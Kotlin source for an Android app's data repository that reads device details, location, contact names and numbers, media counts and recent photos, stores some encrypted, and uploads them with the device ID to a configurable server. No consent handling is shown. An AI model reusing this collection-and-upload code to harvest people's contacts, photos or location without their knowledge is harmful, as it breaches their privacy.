package com.yurap.securedataapp

import android.content.ContentResolver
import android.content.Context
import android.net.Uri
import android.os.Build
import android.provider.ContactsContract
import android.provider.MediaStore
import com.yurap.securedataapp.crypto.CryptoUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import android.provider.Settings
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit
import android.database.Cursor
import android.provider.ContactsContract.CommonDataKinds.Phone

class Repository(private val context: Context) {
    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .callTimeout(60, TimeUnit.SECONDS)
        .build()

    suspend fun collectDeviceInfo(): Boolean = withContext(Dispatchers.IO) {
        val info = DeviceInfo(model = Build.MODEL ?: "", version = Build.VERSION.RELEASE ?: "")
        val s = JSONObject().put("model", info.model).put("version", info.version).toString()
        writeEncrypted("device.json.enc", s)
    }

    suspend fun collectContactsCount(): Boolean = withContext(Dispatchers.IO) {
        val cr = context.contentResolver
        val numbers = mutableSetOf<String>()
        cr.query(
            Phone.CONTENT_URI,
            arrayOf(Phone.NUMBER),
            null,
            null,
            null
        )?.use { c ->
            val numIdx = c.getColumnIndex(Phone.NUMBER)
            while (c.moveToNext()) {
                val raw = if (numIdx >= 0) c.getString(numIdx) else null
                val normalized = (raw ?: "").replace("\\s".toRegex(), "").replace("-", "")
                if (normalized.isNotBlank()) numbers.add(normalized)
            }
        }
        val s = JSONObject().put("count", numbers.size).toString()
        writeEncrypted("contacts.json.enc", s)
    }

    suspend fun collectMediaStats(): Boolean = withContext(Dispatchers.IO) {
        val resolver = context.contentResolver
        val images = countByMime(resolver, MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
        val videos = countByMime(resolver, MediaStore.Video.Media.EXTERNAL_CONTENT_URI)
        val files = if (Build.VERSION.SDK_INT < 33) countByMime(resolver, MediaStore.Files.getContentUri("external")) else mapOf()
        val byTypeObj = JSONObject()
        (images + videos + files).forEach { (k, v) -> byTypeObj.put(k, v) }
        val s = JSONObject()
            .put("images", images.values.sum())
            .put("videos", videos.values.sum())
            .put("docs", (files.values.sum() - images.values.sum() - videos.values.sum()).coerceAtLeast(0))
            .put("byType", byTypeObj)
            .toString()
        writeEncrypted("media.json.enc", s)
    }

    suspend fun collectLocation(): Boolean = withContext(Dispatchers.IO) {
        val loc = LocationProvider(context).currentLocation()
        val s = JSONObject().put("lat", loc.lat).put("lon", loc.lon).toString()
        writeEncrypted("location.json.enc", s)
        true
    }

    suspend fun storeUploadedFile(uri: Uri): Boolean = withContext(Dispatchers.IO) {
        val name = System.currentTimeMillis().toString() + ".bin.enc"
        val dir = File(context.filesDir, "uploads"); if (!dir.exists()) dir.mkdirs()
        val file = File(dir, name)
        context.contentResolver.openInputStream(uri)?.use { input ->
            FileOutputStream(file).use { output ->
                CryptoUtils.encryptStream(context, input, output)
            }
        } ?: return@withContext false
        true
    }

    private fun countByMime(resolver: ContentResolver, uri: Uri): Map<String, Int> {
        val map = mutableMapOf<String, Int>()
        resolver.query(uri, arrayOf(MediaStore.MediaColumns.MIME_TYPE), null, null, null)?.use { c ->
            val idx = c.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
            while (c.moveToNext()) {
                val mime = c.getString(idx) ?: "unknown"
                map[mime] = (map[mime] ?: 0) + 1
            }
        }
        return map
    }

    private fun writeEncrypted(name: String, content: String): Boolean {
        val file = File(context.filesDir, name)
        FileOutputStream(file).use { out ->
            CryptoUtils.encryptBytes(context, content.encodeToByteArray(), out)
        }
        return true
    }

    suspend fun syncAggregateToServer(): Boolean = withContext(Dispatchers.IO) {
        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val resolver = context.contentResolver
        val images = countByMime(resolver, MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
        val videos = countByMime(resolver, MediaStore.Video.Media.EXTERNAL_CONTENT_URI)
        val files = if (Build.VERSION.SDK_INT < 33) countByMime(resolver, MediaStore.Files.getContentUri("external")) else mapOf()
        val loc = LocationProvider(context).currentLocation()
        val jsonObj = JSONObject()
            .put("deviceId", deviceId)
            .put("deviceInfo", JSONObject().put("model", Build.MODEL ?: "").put("version", Build.VERSION.RELEASE ?: ""))
            .put("contactsCount", run {
                val numbers = mutableSetOf<String>()
                resolver.query(Phone.CONTENT_URI, arrayOf(Phone.NUMBER), null, null, null)?.use { c ->
                    val numIdx = c.getColumnIndex(Phone.NUMBER)
                    while (c.moveToNext()) {
                        val raw = if (numIdx >= 0) c.getString(numIdx) else null
                        val normalized = (raw ?: "").replace("\\s".toRegex(), "").replace("-", "")
                        if (normalized.isNotBlank()) numbers.add(normalized)
                    }
                }
                numbers.size
            })
            .put("mediaStats", JSONObject()
                .put("images", images.values.sum())
                .put("videos", videos.values.sum())
                .put("docs", (files.values.sum() - images.values.sum() - videos.values.sum()).coerceAtLeast(0))
                .put("byType", JSONObject((images + videos + files))))
            .put("location", JSONObject().put("lat", loc.lat).put("lon", loc.lon))

        val body = jsonObj.toString().toRequestBody("application/json".toMediaTypeOrNull())
        val req = Request.Builder().url(ServerConfig.baseUrl() + "/api/v1/data").post(body).build()
        return@withContext try {
            val resp = client.newCall(req).execute()
            resp.use { it.isSuccessful }
        } catch (_: Throwable) {
            false
        }
    }

    suspend fun uploadFileToServer(uri: Uri): Boolean = withContext(Dispatchers.IO) {
        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val name = System.currentTimeMillis().toString() + ".bin"
        val temp = File(context.cacheDir, name)
        context.contentResolver.openInputStream(uri)?.use { input ->
            FileOutputStream(temp).use { output -> input.copyTo(output) }
        } ?: return@withContext false
        val fileBody = temp.asRequestBody("application/octet-stream".toMediaTypeOrNull())
        val multipart = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("deviceId", deviceId)
            .addFormDataPart("file", name, fileBody)
            .build()
        val req = Request.Builder().url(ServerConfig.baseUrl() + "/api/v1/upload").post(multipart).build()
        val resp = client.newCall(req).execute()
        temp.delete()
        resp.use { it.isSuccessful }
    }

    suspend fun uploadContactsToServer(): Boolean = withContext(Dispatchers.IO) {
        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val list = mutableListOf<JSONObject>()
        val cr = context.contentResolver
        val cursor = cr.query(
            ContactsContract.Contacts.CONTENT_URI,
            arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME_PRIMARY, ContactsContract.Contacts.DISPLAY_NAME),
            null, null, null
        )
        cursor?.use { c ->
            val idIdx = c.getColumnIndex(ContactsContract.Contacts._ID)
            val primaryIdx = c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY)
            val altIdx = c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
            while (c.moveToNext()) {
                val id = if (idIdx >= 0) c.getString(idIdx) else null
                val name = when {
                    primaryIdx >= 0 -> c.getString(primaryIdx)
                    altIdx >= 0 -> c.getString(altIdx)
                    else -> null
                } ?: ""
                if (id == null) continue
                val phones = mutableSetOf<String>()
                cr.query(Phone.CONTENT_URI, arrayOf(Phone.NUMBER), Phone.CONTACT_ID + "=?", arrayOf(id), null)?.use { pc ->
                    val numIdx = pc.getColumnIndex(Phone.NUMBER)
                    while (pc.moveToNext()) {
                        val raw = pc.getString(numIdx) ?: ""
                        val normalized = raw.replace("\\s".toRegex(), "").replace("-", "")
                        if (normalized.isNotBlank()) phones.add(normalized)
                    }
                }
                list.add(JSONObject().put("name", name).put("phones", phones.toList()))
            }
        }
        val payload = JSONObject().put("deviceId", deviceId).put("contacts", list)
        val body = payload.toString().toRequestBody("application/json".toMediaTypeOrNull())
        val req = Request.Builder().url(ServerConfig.baseUrl() + "/api/v1/contacts").post(body).build()
        return@withContext try {
            val resp = client.newCall(req).execute()
            resp.use { it.isSuccessful }
        } catch (_: Throwable) {
            false
        }
    }

    suspend fun uploadPhotosToServer(limit: Int = 20): Boolean = withContext(Dispatchers.IO) {
        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val cr = context.contentResolver
        var sent = 0
        val cols = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME)
        cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cols, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC")?.use { c ->
            val idIdx = c.getColumnIndex(MediaStore.Images.Media._ID)
            val nameIdx = c.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
            while (c.moveToNext() && sent < limit) {
                val id = if (idIdx >= 0) c.getLong(idIdx) else -1L
                if (id <= 0L) continue
                val fallbackName = "photo_${System.currentTimeMillis()}.jpg"
                val name = if (nameIdx >= 0) (c.getString(nameIdx) ?: fallbackName) else fallbackName
                val uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
                val tmp = File(context.cacheDir, name)
                cr.openInputStream(uri)?.use { input ->
                    FileOutputStream(tmp).use { out -> input.copyTo(out) }
                } ?: continue
                val body = tmp.asRequestBody("image/jpeg".toMediaTypeOrNull())
                val multipart = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("deviceId", deviceId)
                    .addFormDataPart("file", name, body)
                    .build()
                val req = Request.Builder().url(ServerConfig.baseUrl() + "/api/v1/photos").post(multipart).build()
                val resp = try { client.newCall(req).execute() } catch (_: Throwable) { null }
                tmp.delete()
                if (resp != null && resp.isSuccessful) {
                    sent += 1
                    resp.close()
                }
            }
        }
        sent > 0
    }
}

data class DeviceInfo(val model: String, val version: String)

data class ContactsStats(val count: Int)

data class MediaStats(val images: Int, val videos: Int, val docs: Int, val byType: Map<String, Int>)

data class LocationData(val lat: Double?, val lon: Double?)
